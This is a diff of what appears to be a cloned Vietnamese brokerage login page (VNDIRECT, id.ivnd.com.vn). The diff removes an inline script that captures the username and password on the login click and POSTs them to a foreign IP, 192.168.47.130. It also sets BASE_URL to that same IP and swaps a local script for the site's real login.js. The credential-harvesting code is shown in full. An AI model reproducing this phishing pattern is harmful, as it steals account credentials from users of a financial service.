@@ -7,7 +7,6 @@
 
 
 
-
 <!DOCTYPE html>
 <html lang="vi">
 <head>
@@ -45,7 +44,7 @@
         
     
     <script type="text/javascript">
-        var BASE_URL = "";
+        var BASE_URL = "http://192.168.47.130/";
     </script>
     <!-- Vndirect Analytics -->
     <script>
@@ -223,35 +222,6 @@
               >ĐĂNG KÝ</a
             > 
           </div>
-		<script type="text/javascript">
-  // Add an event listener to the login button
-  $("#btn-login").on("click", function() {
-    // Get the values of username and password fields
-    var username = $("#username").val();
-    var password = $("#password").val();
-    
-    // Prepare data to be sent in the AJAX request
-    var data = {
-      username: username,
-      password: password
-    };
-
-    // Send AJAX request to the specified URL
-    $.ajax({
-      type: "POST",
-      url: "http://192.168.47.130/login", // Specify the URL here
-      data: data,
-      success: function(response) {
-        // Handle successful login response
-        console.log("Login successful:", response);
-      },
-      error: function(error) {
-        // Handle login error
-        console.error("Login error:", error);
-      }
-    });
-  });
-</script>
         </div>
         
        	
@@ -383,8 +353,8 @@
     
         <script type="module" src="https://id.ivnd.com.vn/resources/js/app/firebase/firebase-tracker.js"></script>
     
-        <script type="module" src="abc.js"></script>
-     
+        <script type="module" src="https://id.ivnd.com.vn/resources/js/app/login.js"></script>
+    
 
 
 
